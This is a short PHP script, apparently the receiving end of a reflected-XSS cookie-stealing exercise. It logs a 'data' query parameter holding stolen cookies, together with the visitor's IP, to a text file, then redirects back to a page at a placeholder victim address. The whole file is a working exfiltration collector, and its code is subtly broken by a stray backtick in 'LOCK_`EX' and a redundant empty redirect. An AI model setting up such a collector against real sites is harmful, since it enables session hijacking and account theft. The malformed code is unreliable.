<?php
$data = $_GET['data'] . "| {$_SERVER['REMOTE_ADDR']}";

file_put_contents('userdata.txt', $data.PHP_EOL, FILE_APPEND | LOCK_`EX);
header("location: http://<victim_ip>:8888/php-security/xss/reflectedxss_stealcookies.php");

header("location: ");
?>
